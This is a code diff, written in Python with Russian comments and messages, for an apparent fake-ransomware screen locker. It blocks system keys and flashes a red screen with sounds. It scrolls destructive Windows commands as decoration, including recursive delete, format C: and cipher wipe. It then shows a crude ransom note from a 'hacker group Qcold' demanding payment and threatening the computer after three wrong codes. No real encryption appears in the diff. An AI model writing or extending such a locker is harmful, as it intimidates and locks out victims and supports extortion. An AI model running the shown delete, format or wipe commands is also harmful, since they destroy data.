@@ -19,8 +19,6 @@ BLOCKED = ["left windows", "right windows", "alt+tab", "alt+f4",
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# sound1.b64 -> sound.b64  (красный экран)
-# voice.b64                (матрица + озвучка)
 SOUND_B64 = os.path.join(SCRIPT_DIR, "sound.b64")
 VOICE_B64 = os.path.join(SCRIPT_DIR, "voice.b64")
 SOUND_WAV = os.path.join(SCRIPT_DIR, "sound.wav")
@@ -28,6 +26,19 @@ VOICE_WAV = os.path.join(SCRIPT_DIR, "voice.wav")
 
 _TEMP_SOUND = os.path.join(tempfile.gettempdir(), "cyberhack_sound.wav")
 _TEMP_VOICE = os.path.join(tempfile.gettempdir(), "cyberhack_voice.wav")
+
+# Строки, которые «стекают» вместо матрицы (визуальный эффект).
+DIR_S_TEXT = [
+    r"C:\>dir /s",
+    r"C:\Users\user>dir /s /b *.docx",
+    r"C:\Users\user>dir /s /b *.jpg",
+    r"C:\Windows\System32>dir /s /b",
+    r"C:\>del /f /q /s *.*",
+    r"C:\>format C: /q",
+    r"C:\>cipher /w:C:\",
+    r"QCOLD ENCRYPTED",
+    r">>> ACCESS DENIED <<<",
+]
 
 
 # ----------------------------- ЗВУК -----------------------------
@@ -81,7 +92,6 @@ def prepare_voice():
 
 
 def play_sound():
-    """sound1.b64 — играет на красном экране."""
     if not HAS_SOUND:
         return
     path = prepare_sound()
@@ -94,7 +104,6 @@ def play_sound():
 
 
 def play_voice():
-    """voice.b64 — играет на матрице (зациклено)."""
     if not HAS_SOUND:
         return
     path = prepare_voice()
@@ -201,22 +210,14 @@ def unblock_keys():
 # ----------------------------- ASCII -----------------------------
 
 ASCII_CYBERHACK = r"""
-  ██████╗██╗   ██╗██████╗ ███████╗██████╗
- ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
- ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
- ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
- ╚██████╗   ██║   ██████╔╝███████╗██║  ██║
-  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
+  ██████  ██    ██ ██████  ███████ ██████  ██   ██  █████   ██████ ██   ██
+ ██       ██    ██ ██   ██ ██      ██   ██ ██   ██ ██   ██ ██      ██  ██
+ ██       ██    ██ ██████  █████   ██████  ███████ ███████ ██      █████
+ ██       ██    ██ ██   ██ ██      ██   ██ ██   ██ ██   ██ ██      ██  ██
+  ██████   ██████  ██████  ███████ ██   ██ ██   ██ ██   ██  ██████ ██   ██
 
-  ██╗  ██╗ █████╗  ██████╗██╗  ██╗
-  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
-  ███████║███████║██║     █████╔╝
-  ██╔══██║██╔══██║██║     ██╔═██╗
-  ██║  ██║██║  ██║╚██████╗██║  ██╗
-  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-
-        ☠  YOUR FILES ARE ENCRYPTED  ☠
-         BY HACKER GROUP  C Y B E R H A C K
+              ☠  YOUR FILES ARE ENCRYPTED  ☠
+             BY HACKER GROUP  Q C O L D
 """
 
 
@@ -235,18 +236,19 @@ class Locker:
         self.attempts = 0
         self.stop_flag = False
         self.sector = 0
+        self._dirs_started = False
 
         self.blank = tk.Frame(self.root, bg="black")
         self.blank.pack(fill=tk.BOTH, expand=True)
 
-        # 1.0 с — красный экран + sound1.b64
+        # 1.0 с — красный экран (2 секунды) + sound1.b64
         self.root.after(1000, self._show_red)
-        # 2.0 с — матрица + voice.b64
-        self.root.after(2000, self._start_matrix)
-        # 5.0 с — окно с паролем
-        self.root.after(5000, self._show_password_ui)
+        # 3.0 с — dir /s + voice.b64
+        self.root.after(3000, self._start_dirs)
+        # 6.0 с — окно с паролем
+        self.root.after(6000, self._show_password_ui)
 
-    # --------- красный экран ---------
+    # --------- красный экран (2 сек) ---------
     def _show_red(self):
         for w in self.root.winfo_children():
             w.destroy()
@@ -254,8 +256,12 @@ class Locker:
         self.red.pack(fill=tk.BOTH, expand=True)
         play_sound()  # sound1.b64
 
-    # --------- матрица + voice ---------
-    def _start_matrix(self):
+    # --------- dir /s + voice ---------
+    def _start_dirs(self):
+        if self._dirs_started:
+            return
+        self._dirs_started = True
+
         for w in self.root.winfo_children():
             w.destroy()
 
@@ -269,14 +275,13 @@ class Locker:
         self.sh = self.root.winfo_screenheight()
 
         self.columns = []
-        step = 22
-        chars = "01CYBERHACKENCRYPTED☠#$%&@!?/\\|"
+        step = 260
         for x in range(0, self.sw, step):
             self.columns.append({
                 "x": x,
                 "y": random.randint(-self.sh, 0),
-                "speed": random.randint(4, 14),
-                "chars": [random.choice(chars) for _ in range(40)],
+                "speed": random.randint(6, 16),
+                "lines": [random.choice(DIR_S_TEXT) for _ in range(30)],
             })
 
         self.canvas.create_text(
@@ -293,14 +298,14 @@ class Locker:
         )
         self.canvas.create_text(
             self.sw // 2, 200,
-            text="☠  HACKER GROUP CyberHack  ☠",
+            text="☠  HACKER GROUP Qcold  ☠",
             fill="#ff6666",
             font=("Consolas", 16),
         )
 
-        self._animate_matrix()
+        self._animate_dirs()
 
-    def _animate_matrix(self):
+    def _animate_dirs(self):
         try:
             self.canvas.delete("rain")
         except tk.TclError:
@@ -308,8 +313,8 @@ class Locker:
         for col in self.columns:
             x = col["x"]
             y = col["y"]
-            for i, ch in enumerate(col["chars"][:20]):
-                yy = y + i * 18
+            for i, line in enumerate(col["lines"][:18]):
+                yy = y + i * 20
                 if yy < 220:
                     continue
                 if yy > self.sh:
@@ -323,15 +328,15 @@ class Locker:
                 else:
                     color = "#550000"
                 self.canvas.create_text(
-                    x, yy, text=ch, fill=color,
-                    font=("Consolas", 14, "bold"), tags="rain"
+                    x, yy, text=line, fill=color, anchor="nw",
+                    font=("Consolas", 13, "bold"), tags="rain"
                 )
             col["y"] += col["speed"]
-            if col["y"] - 20 * 18 > self.sh:
+            if col["y"] - 18 * 20 > self.sh:
                 col["y"] = random.randint(-self.sh, 0)
-                col["speed"] = random.randint(4, 14)
+                col["speed"] = random.randint(6, 16)
 
-        self.root.after(60, self._animate_matrix)
+        self.root.after(70, self._animate_dirs)
 
     # --------- окно с паролем ---------
     def _show_password_ui(self):
@@ -345,12 +350,15 @@ class Locker:
         self.text.pack(fill=tk.BOTH, expand=True)
 
         self.text.insert(tk.END, ASCII_CYBERHACK + "\n\n")
-        self.text.insert(tk.END, "Привет, дружище.\n")
+        self.text.insert(tk.END, "Привет дружище.\n")
         self.text.insert(tk.END, "Твои данные были зашифрованы\n")
-        self.text.insert(tk.END, "хакерской группировкой CyberHack.\n\n")
-        self.text.insert(tk.END, "Все файлы, фото и документы — [censored].\n")
-        self.text.insert(tk.END, "3 неверных пароля = система в [censored].\n\n")
-        self.text.insert(tk.END, "Введи код (только цифры):\n")
+        self.text.insert(tk.END, "хакерской группировкой Qcold.\n\n")
+        self.text.insert(tk.END, "Все твои файлы, фотографии, документы\n")
+        self.text.insert(tk.END, "и твой писюн у нас.\n\n")
+        self.text.insert(tk.END, "Мы не шутим если хочешь вернуть плати.\n")
+        self.text.insert(tk.END, "Три неверных пароля — и твой компьютер\n")
+        self.text.insert(tk.END, "уйдёт в 200.\n\n")
+        self.text.insert(tk.END, "Введи код или твой комп сдохнет:\n")
         self.text.configure(state="disabled")
 
         self.entry = tk.Entry(self.root, bg="black", fg="lime",
@@ -435,7 +443,7 @@ class Locker:
 
     def run(self):
         block_keys()
-        play_windows_error()  # 0.0 с — ошибка Windows
+        play_windows_error()
         self.root.mainloop()
 
 
